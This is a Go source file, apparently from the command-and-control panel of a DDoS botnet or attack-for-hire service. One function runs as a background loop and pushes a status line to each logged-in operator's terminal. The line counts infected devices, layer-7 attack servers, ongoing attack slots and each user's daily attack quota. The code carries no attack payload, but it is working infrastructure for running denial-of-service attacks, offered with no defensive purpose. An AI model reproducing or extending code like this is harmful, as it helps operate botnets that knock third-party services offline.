package main

import (
	"fmt"
	"time"
)

// Runs in the background once the master server has started
func Title() {
	for {
		slots, err := OngoingAttacks(time.Now())
		if err != nil {
			slots = make([]AttackLog, 0)
		}

		workersMux.RLock()
		l7Count := len(workers)
		workersMux.RUnlock()

		for id, session := range Sessions {
			sent, err := UserOngoingAttacks(session.User.Username, time.Date(time.Now().Year(), time.Now().Month(), time.Now().Day(), 0, 0, 0, 0, time.Now().Location()))
			if err != nil {
				// Handle the error
			}

			// Check if attacks are disabled
			if !Attacks {
				if _, err := session.Conn.Write([]byte(fmt.Sprintf("\033]0;Devices: %d | Servers: %d | Slots: %d/%d | Sessions: %d | Attacks: Disabled \007", len(Clients), l7Count, len(slots), Options.Templates.Attacks.MaximumOngoing, len(Sessions)))); err != nil {
					delete(Sessions, id)
					return
				}
			} else {
				if _, err := session.Conn.Write([]byte(fmt.Sprintf("\033]0;Devices: %d | Servers: %d | Slots: %d/%d | Sessions: %d | Attacks: %d/%d \007", len(Clients), l7Count, len(slots), Options.Templates.Attacks.MaximumOngoing, len(Sessions), len(sent), session.User.MaxDaily))); err != nil {
					delete(Sessions, id)
					return
				}
			}
		}

		time.Sleep(1 * time.Second)
	}
}
